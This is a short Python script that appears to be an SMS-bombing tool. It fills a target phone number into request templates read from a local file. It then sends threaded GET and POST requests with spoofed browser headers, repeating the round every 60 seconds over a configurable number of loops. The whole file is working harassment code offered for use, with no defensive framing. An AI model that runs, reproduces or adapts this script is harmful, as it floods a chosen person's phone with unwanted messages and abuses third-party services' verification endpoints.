#!/usr/bin/env python
#coding:utf-8
__author__ = 'mtfly'

import requests
import sys
import time
import threading
from re import split,sub
from optparse import OptionParser

def attack_post(mtfly):
    url = mtfly[1]
    mtfly[2] = split('&',mtfly[2])
    dics = {}
    for i in range(len(mtfly[2])):
        mtfly[2][i] = split('=', mtfly[2][i])
        dics.setdefault(mtfly[2][i][0], mtfly[2][i][1])

    payload = dics
    headers = {'Referer': mtfly[3],
    'Content-Type':'application/json;charset=UTF-8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}
    print(url)
    print(payload)
    print(headers)
    response = requests.post(url, json=payload, headers=headers)
    print(response.text)
		
def attack_get(mtfly):
    url = mtfly[1]
    headers = {'Referer': mtfly[3],
    'X-Requested-With':'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}
    print(url)
    print(headers)
    response = requests.get(url, headers=headers)
    print(response.text)

		
def attack(mi):
    mtfly = split('::|\n', mi)
    if mtfly[0] == 'get':
        attack_get(mtfly)
    elif mtfly[0] == 'post':
        attack_post(mtfly)

def t_attack(m):
    threads = []
    nloops = range(len(m))
    for i in nloops:        
        t = threading.Thread(target=attack, args=(m[i],))
        threads.append(t)
    for i in nloops:
        threads[i].start()
    for i in nloops:     
        threads[i].join()

p = OptionParser()
p.add_option('-n', '--number', default=13999999999, help='The phone\'number')
p.add_option('-l', '--loop', default=10, help='The number of loop')
options, args = p.parse_args()
pn = options.number
loop = int(options.loop)
m = list()
    
try:
    f = open('mtfly.txt','r')
except Exception:
    print("post fail!")
for eachLine in f.readlines():
    eachLine = sub('phone_number', str(pn), eachLine)
    eachLine = eachLine.strip()
    m.append(eachLine)
for il in range(loop):
    t_attack(m)
    time.sleep(60)
f.close()
print("all jobs done!")




        
